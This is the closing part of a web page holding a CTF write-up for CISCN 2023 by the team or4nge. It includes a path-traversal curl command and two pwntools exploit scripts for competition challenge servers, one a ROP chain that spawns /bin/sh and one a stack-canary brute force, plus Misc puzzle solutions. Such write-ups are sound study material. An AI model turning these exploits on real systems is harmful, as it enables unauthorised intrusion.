			srcset="/post/ciscn-2023-writeup-by-or4nge/re10_hu23724fab3e153e51025302e78f8fe95c_34133_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/re10_hu23724fab3e153e51025302e78f8fe95c_34133_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
<code>/temp/img</code>后可以跟..字符，获得父目录的文件内容​
于是可以使用curl获取位于根目录的flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl --path-as-is <span style="color:#e6db74">&#39;http://47.104.67.173:8000/temp/img/../../flag&#39;</span> 
</span></span></code></pre></div><h2 id="pwn">Pwn</h2>
<h3 id="烧烤摊儿">烧烤摊儿​</h3>
<p>负数增加余额，ROP​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p=process(&#39;./shaokao&#39;)​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;123.56.135.185&#39;</span>,<span style="color:#ae81ff">18088</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>rdi_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x40264f</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>rsi_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x40a67e</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>rdx_rbx_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4a404b</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>rax_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x458827</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>syscall<span style="color:#f92672">=</span><span style="color:#ae81ff">0x402404</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span><span style="color:#f92672">+</span>p64(rdi_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4E60F0</span>)<span style="color:#f92672">+</span>p64(rsi_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(rdx_rbx_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>p64(rax_addr)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">59</span>)<span style="color:#f92672">+</span>p64(syscall)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;3. 勇闯天涯</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;来几瓶？</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-10000&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;烧烤摊儿已归你所有，请赐名：</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="funcanary">funcanary​</h3>
<p>一字节一字节爆破canary，爆破返回地址低两字节至backdoor​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;123.56.238.150&#39;</span>,<span style="color:#ae81ff">37566</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p=process(&#39;./funcanary&#39;)​</span>
</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>canary<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        canary<span style="color:#f92672">=</span>canary[:i]<span style="color:#f92672">+</span>j<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">+</span>canary[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(canary)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;welcome</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload<span style="color:#f92672">+</span>canary)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(s)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> s<span style="color:#f92672">==</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;have fun</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span><span style="color:#f92672">+</span>canary<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>(i<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recv()<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    print(s)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>pause()
</span></span></code></pre></div><h2 id="misc">Misc</h2>
<h3 id="被加密的生产流量">被加密的生产流量​</h3>
<p>流量包中发现Modbus协议流量，追踪流发现明文传输的base32编码数据，解码拿到flag。​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 576; 
			flex-basis: 1383px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc1.png" data-size="1280x222">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc1.png"
			width="1280"
			height="222"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc1_hue4f0d305f38a365e41bf71b72b0ed0e4_134700_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc1_hue4f0d305f38a365e41bf71b72b0ed0e4_134700_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 229; 
			flex-basis: 550px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc2.png" data-size="592x258">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc2.png"
			width="592"
			height="258"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc2_hu342cfc08dfb57b20bba2753a2dea71d7_3759_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc2_hu342cfc08dfb57b20bba2753a2dea71d7_3759_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="国粹">国粹​</h3>
<p>给了三个图​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 576; 
			flex-basis: 1383px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc3.png" data-size="1280x222">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc3.png"
			width="1280"
			height="222"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc3_hu3c3f07fd55f5551436ae247a178cfb78_189381_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc3_hu3c3f07fd55f5551436ae247a178cfb78_189381_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 390; 
			flex-basis: 936px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc4.PNG" data-size="1280x328">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc4.PNG"
			width="1280"
			height="328"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc4_hu8216e9685cf8ed020f41b7de804a694b_136903_480x0_resize_box_3.PNG 480w, /post/ciscn-2023-writeup-by-or4nge/misc4_hu8216e9685cf8ed020f41b7de804a694b_136903_1024x0_resize_box_3.PNG 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 516; 
			flex-basis: 1238px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc5.png" data-size="1280x248">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc5.png"
			width="1280"
			height="248"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc5_hu4142173ab9fa23b467942f4fc72a7461_107916_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc5_hu4142173ab9fa23b467942f4fc72a7461_107916_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
将a和k拼在一起，会发现k按照a的分段，用ps拼接然后处理，观察​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 156; 
			flex-basis: 376px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc6.png" data-size="1280x817">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc6.png"
			width="1280"
			height="817"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc6_hua20c98bd26914a16b1ffad04f9f1c66f_488790_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc6_hua20c98bd26914a16b1ffad04f9f1c66f_488790_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
考虑某种编码，但由于长度不定，而且所有的排列都是按顺序的，所以不太可能是编码​
后来想了一下，前面的四五万，三四五六万，三四万，二三二五万，三四万……想象一下很像一个“F”的形状​
所以考虑是表格画图​
a为行，k为列，拿表格画一下觉得没问题，手工把坐标给一个个写出来</p>
<pre tabindex="0"><code>1​
4 5 10 30​
2 ​
3 4 5 6 10 29 30​
3​
3 4 10 16 17 22 23 24 25 29 30​
4​
2 3 4 5 10 15 16 18 21  22 24 25 29 30​
5​
3 4 10 15 17 18 19 21 22 25 28 29​
6​
3 4 10 15 16 18 19 21 22 25 29​
7​
3 4 10 11 12 13 15 18 19 22 23 24 25 29 30​
8​
3 4 11 12 15 16 17 18 19 20 25 29 30​
9​
21 22 24 25 30 31​
10 ​
23 24​
11​
​
12​
22 23 24 25​
13​
2 3 4 5 9 10 11 12 16 17 18 19 24 25​
14​
2 5 6 9 12 19 23 24​
15​
5 9 12 18 19 22 23​
16​
4 5 9 12 17 18 23 24​
17​
3 4 9 12 16 17 24 25​
18​
3 9 12 16 25​
19​
3 4 5 6 9 10 11 12 16 17 18 19 21 22 23 24 25​
20​
10 11​
21​
​
22​
3 4 5 6 10 11 12 17 18 19 24 25​
23​
3 6 7 9 10 16 17 19 20 22 23 24 25​
24​
3 6 7 9 10 16 19 20 24 25​
25​
3 6 7 10 11 12 16 19 20 24 25​
26​
3 6 7 12 13 16 19 20 24 25​
27​
3 6 7 9 12 13 16 19 20 24 25​
28​
3 4 6 9 10 11 12 16 17 19 20 24 25​
29​
4 5 17 18 19​
30​
​
31​
10 11 12 13 25 31​
32​
4 5 6 10 11 12 13 17 18 19 23 24 25 26 32​
33​
3 4 6 7 12 16 17 23 24 26 32​
34​
6 7 11 16 17 23 24 26 32​
35​
6 11 12 17 18 19 23 24 25 26 33​
36​
5 12 13 19 20 26 32​
37​
4 5 13 16 19 20 25 26 32​
38​
4 5 6 7 9 10 11 12 13 16 17 18 19 24 25 31 32​
39​
23 24 31
</code></pre><p>再用py写个脚本​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    table<span style="color:#f92672">=</span>[]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">39</span>):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        tmp<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39; &#39;</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">42</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        line<span style="color:#f92672">=</span>input()<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(line)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        w<span style="color:#f92672">=</span>input()<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(w)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> w:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">=</span>list(map(int,w<span style="color:#f92672">.</span>split()))<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> r:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>            tmp[j]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;▇&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        table<span style="color:#f92672">.</span>append(tmp)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i,j <span style="color:#f92672">in</span> enumerate(table):<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(i,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        print(j)
</span></span></code></pre></div><p>结果
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 174; 
			flex-basis: 417px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/misc7.png" data-size="1280x735">
		<img src="/post/ciscn-2023-writeup-by-or4nge/misc7.png"
			width="1280"
			height="735"
			srcset="/post/ciscn-2023-writeup-by-or4nge/misc7_hud1e15f56c7b34488a928b0ec9298b61b_361558_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/misc7_hud1e15f56c7b34488a928b0ec9298b61b_361558_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/ciscn/">CISCN</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/ciscn-2022-north-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/ciscn-2022-north-writeup-by-or4nge/cover.fdd1e3d117f12d7fcd887f75f2c6085f_hu64e9dce0f7c55970c8dfa2838c4ad483_501581_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-/dHj0RfxLX/NiH918sYIXw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CISCN2022 华北分赛区 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/ciscn-2022-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/ciscn-2022-writeup-by-or4nge/cover.dd9a1f3516fd809e1fd436da1fd62443_hua298b546d0b49e7ca84fa027f7c430e6_662553_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-3ZofNRb9gJ4f1DbaH9YkQw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CISCN2022 初赛 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/xhlj-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">西湖论剑 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/qwnt-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">“强网”拟态 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/wdb2022-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">2022网鼎杯初赛 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#dumpit">dumpit​</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#基于国密sm2算法的密钥密文分发">基于国密SM2算法的密钥密文分发​</a></li>
        <li><a href="#sign_in_passwd">Sign_in_passwd​</a></li>
        <li><a href="#可信度量2">可信度量2​</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#ezbyte">ezbyte</a></li>
        <li><a href="#babyre">babyRE</a></li>
        <li><a href="#moveaside">moveAside</a></li>
        <li><a href="#ezandroid">ezAndroid​</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#烧烤摊儿">烧烤摊儿​</a></li>
        <li><a href="#funcanary">funcanary​</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#被加密的生产流量">被加密的生产流量​</a></li>
        <li><a href="#国粹">国粹​</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
